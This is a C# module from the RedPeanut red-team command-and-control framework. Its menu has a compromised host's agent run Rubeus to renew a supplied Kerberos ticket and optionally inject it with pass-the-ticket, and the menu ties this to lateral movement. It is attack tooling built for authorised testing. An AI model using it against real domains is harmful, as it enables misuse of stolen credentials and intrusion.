//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.Linq;
using static RedPeanut.Utility;

namespace RedPeanut
{
    class RubeusRenewManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set dc", "Set set domain controller" },
            { "set ptt", "Set ptt flag" },
            { "set ticket", "Set kirbi file or base64 rep" },
            { "set autorenew", "Set autorenew flag" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        IAgentInstance agent = null;
        string modulename = "renew";
        string dc;
        bool ptt;
        string ticket;
        bool autorenew;

        public RubeusRenewManager()
        {

        }

        public RubeusRenewManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                RubeusRenewMenu(input);
            } while (input != "back");
        }

        private void RubeusRenewMenu(string input)
        {
            string[] a_input = input.Split(' ');
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set dc":
                            dc = GetParsedSetString(input);
                            break;
                        case "set ptt":
                            ptt = GetParsedSetBool(input);
                            break;
                        case "set autorenew":
                            autorenew = GetParsedSetBool(input);
                            break;
                        case "set ticket":
                            ticket = GetParsedSetString(input);
                            break;
                        
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }
        
        private void Run()
        {
            List<string> args = new List<string>();
            args.Add("renew");
            
            if (!string.IsNullOrEmpty(dc))
            {
                args.Add("/dc:" + dc);
            }

            if (ptt)
            {
                args.Add("/ptt");
            }

            if (autorenew)
            {
                args.Add("/autorenew");
            }

            if (!string.IsNullOrEmpty(ticket))
            {
                args.Add("/ticket:" + ticket);
            }

            RunAssembly(PL_MODULE_RUBEUS, "Rubeus.Program", args.ToArray<string>(), agent);

        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "dc", dc },
                { "ptt", ptt.ToString() },
                { "autorenew", autorenew.ToString() },
                { "ticket", ticket }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}

